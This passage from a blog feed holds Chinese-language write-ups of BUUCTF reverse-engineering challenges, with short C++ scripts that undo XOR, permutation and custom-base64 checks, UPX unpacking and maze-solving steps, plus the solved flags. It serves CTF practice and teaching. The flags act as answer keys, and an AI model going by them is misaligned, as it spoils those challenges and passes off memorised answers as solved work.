class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">99</span>] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">64</span>,  <span class="number">53</span>,  <span class="number">32</span>,  <span class="number">86</span>,  <span class="number">93</span>,  <span class="number">24</span>,  <span class="number">34</span>,  <span class="number">69</span>,  <span class="number">23</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">36</span>, <span class="number">110</span>,  <span class="number">98</span>,  <span class="number">60</span>,  <span class="number">39</span>,  <span class="number">84</span>,  <span class="number">72</span>, <span class="number">108</span>,  <span class="number">36</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">114</span>,  <span class="number">60</span>,  <span class="number">50</span>,  <span class="number">69</span>,  <span class="number">91</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> i, tmp;</span><br><span class="line"><span class="type">int</span> key[<span class="number">5</span>];</span><br><span class="line"><span class="type">char</span> s[<span class="number">5</span>] = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = ans[i] ^ s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp = ans[i] ^ key[i % <span class="number">4</span>];</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：Act1ve_Defen5e_Test<br>题出的很好，下次不要出了。</p><h2 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h2><p>打开得到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BMRCTF2020%5DTransform1.png"><br>写出脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">103</span>, <span class="number">121</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">117</span>,  <span class="number">43</span>,  <span class="number">60</span>,  <span class="number">82</span>,  <span class="number">83</span>, <span class="number">121</span>, </span><br><span class="line">   <span class="number">87</span>,  <span class="number">94</span>,  <span class="number">93</span>,  <span class="number">66</span>, <span class="number">123</span>,  <span class="number">45</span>,  <span class="number">42</span>, <span class="number">102</span>,  <span class="number">66</span>, <span class="number">126</span>, </span><br><span class="line">   <span class="number">76</span>,  <span class="number">87</span>, <span class="number">121</span>,  <span class="number">65</span>, <span class="number">107</span>, <span class="number">126</span>, <span class="number">101</span>,  <span class="number">60</span>,  <span class="number">92</span>,  <span class="number">69</span>, </span><br><span class="line">  <span class="number">111</span>,  <span class="number">98</span>,  <span class="number">77</span>&#125;;</span><br><span class="line">    <span class="type">int</span> key[<span class="number">99</span>] = &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">3</span>,<span class="number">17</span>,<span class="number">32</span>,<span class="number">29</span>,<span class="number">11</span>,<span class="number">30</span>,<span class="number">27</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">25</span>,<span class="number">5</span>,<span class="number">31</span>,<span class="number">8</span>,<span class="number">18</span>,<span class="number">26</span>,<span class="number">28</span>,<span class="number">14</span>&#125;;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ans[i] ^= key[i];</span><br><span class="line">    flag[key[i]] = ans[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：Tr4nsp0sltiON_Clph3r_1s_3z</p><h2 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h2><p>这是个RSA，我不理解为什么要出这个。。。<br>flag：Pwn_@_hundred_years</p><h2 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h2><p>有壳，但是可以upx -d，解决后进去即可得到flag：Just_upx_-d</p><h2 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h2><p>进去后可以分析出主加密函数在sub_401080<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt1.png"><br>进去后很开心是个base64，直接解密得到乱码，观察发现函数开始和结尾分别有这两个诡异的东西：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt2.png"><br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt3.png"><br>一个更改密码表，一个更改结果，给它推回去：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> key[<span class="number">99</span>] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span>;</span><br><span class="line"><span class="type">int</span> i, tmp;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">6</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp = key[i + <span class="number">10</span>];</span><br><span class="line">key[i + <span class="number">10</span>] = key[i];</span><br><span class="line">key[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ans[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;amp;&amp;amp; ans[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ans[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;amp;&amp;amp; ans[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] += <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; key[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; ans[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到新的密码表：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<br>旧结果：ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9<br>拿着这两个东西解密得到flag：bAse64_h2s_a_Surprise</p><h2 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h2><p>有壳但是可以upx -d：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BHDCTF2019%5DMaze1.png"><br>进去发现有一个花指令，给它nop掉：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BHDCTF2019%5DMaze2.png"><br>正常编译后得到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BHDCTF2019%5DMaze3.png"><br>在跟进dword_408078和dword_40807C时顺带找出地图：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BHDCTF2019%5DMaze4.png"><br>由起始坐标(7,0)和结束坐标(5,-4)在根据+和F的位置推出地图长这样：<br>*******+**<br>*******s**<br>****ssss**<br>**sss*****<br>**s**F****<br>**ssss****<br>**********<br>走一遍得到flag：ssaaasaassdddw</p><h2 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h2><p>进去F5发现IDA会报个错，跟进提示错误的函数先把它反编译出来，在回来反编译主函数就可以了。应该是IDA遇见了一个它不认识的东西，让他先认识一下就行了:<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BMRCTF2020%5DXor1.png"><br>写个代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">77</span>,  <span class="number">83</span>,  <span class="number">65</span>,  <span class="number">87</span>,  <span class="number">66</span>, <span class="number">126</span>,  <span class="number">70</span>,  <span class="number">88</span>,  <span class="number">90</span>,  <span class="number">58</span>, </span><br><span class="line">   <span class="number">74</span>,  <span class="number">58</span>,  <span class="number">96</span>, <span class="number">116</span>,  <span class="number">81</span>,  <span class="number">74</span>,  <span class="number">34</span>,  <span class="number">78</span>,  <span class="number">64</span>,  <span class="number">32</span>, </span><br><span class="line">   <span class="number">98</span>, <span class="number">112</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">125</span>,  <span class="number">56</span>, <span class="number">103</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">26</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ans[i] ^= i;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">char</span>(ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：@_R3@1ly_E2_R3verse!</p><h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>是一道多线程交替进行的题：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/Youngter-drive1.png"><br>第一个线程是主加密函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/Youngter-drive2.png"><br>可以写出解密脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> ans[] = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">29</span>; i &gt; <span class="number">-1</span>; i -= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(key); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ans[i] == key[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j + <span class="number">38</span> &gt;= <span class="string">&#x27;A&#x27;</span> &amp;amp;&amp;amp; j + <span class="number">38</span> &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans[i] = j + <span class="number">38</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ans[i] = j + <span class="number">96</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到：ThisisthreadofwindowshahaIsES。但是提交不对，经百度，可能题目哪里有那么一niuniu的小问题，需要最后加一个E才能通过。<br>得到flag：ThisisthreadofwindowshahaIsESE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF逆向工程-1&quot;&gt;&lt;a href=&quot;#BUUCTF逆向工程-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF逆向工程-1&quot;&gt;&lt;/a&gt;BUUCTF逆向工程-1&lt;/h1&gt;&lt;h2 id=&quot;easyre&quot;&gt;&lt;a href=&quot;#easyre&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Clovershrub的第一篇博客</title>
    <link href="https://clovershrub.github.io/2022/11/16/Clovershrub%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>https://clovershrub.github.io/2022/11/16/Clovershrub%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-11-15T16:00:00.000Z</published>
    <updated>2023-09-19T01:35:28.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="纪念第一篇博客的诞生"><a href="#纪念第一篇博客的诞生" class="headerlink" title="纪念第一篇博客的诞生~~"></a>纪念第一篇博客的诞生~~</h1><p><img src="/img/Clovershrub%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;纪念第一篇博客的诞生&quot;&gt;&lt;a href=&quot;#纪念第一篇博客的诞生&quot; class=&quot;headerlink&quot; title=&quot;纪念第一篇博客的诞生~~&quot;&gt;&lt;/a&gt;纪念第一篇博客的诞生~~&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/Clovershrub%E7%9A%8</summary>
      
    
    
    
    
  </entry>
  
</feed>
